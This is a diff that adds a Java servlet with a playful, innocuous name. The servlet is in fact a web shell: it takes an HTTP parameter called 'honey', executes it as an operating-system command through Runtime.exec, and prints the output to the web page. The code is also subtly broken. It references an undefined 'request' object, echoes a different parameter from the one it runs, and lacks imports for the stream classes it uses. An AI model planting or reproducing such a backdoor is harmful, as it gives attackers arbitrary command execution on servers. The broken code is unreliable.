@@ -1,0 +1,33 @@
+package randy;
+import java.io.IOException;
+import java.io.PrintWriter;
+import javax.servlet.ServletException;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+
+
+
+
+public class honeyhoneybooboo extends HttpServlet {
+    public honeyhoneybooboo() {
+    }
+    public void doGet(HttpServletRequest var1, HttpServletResponse var2) throws IOException, ServletException {
+        var2.setContentType("text/html");
+        PrintWriter var3 = var2.getWriter();
+
+        String cmd = var1.getParameter("honey");
+        if (cmd != null) {
+            var3.println("Command: " + request.getParameter("cmd") + "<BR>");
+            Process p = Runtime.getRuntime().exec(cmd);
+            OutputStream os = p.getOutputStream();
+            InputStream in = p.getInputStream();
+            DataInputStream dis = new DataInputStream(in);
+            String disr = dis.readLine();
+            while ( disr != null ) {
+                var3.println(disr);
+                disr = dis.readLine();
+            }
+        }
+    }
+}
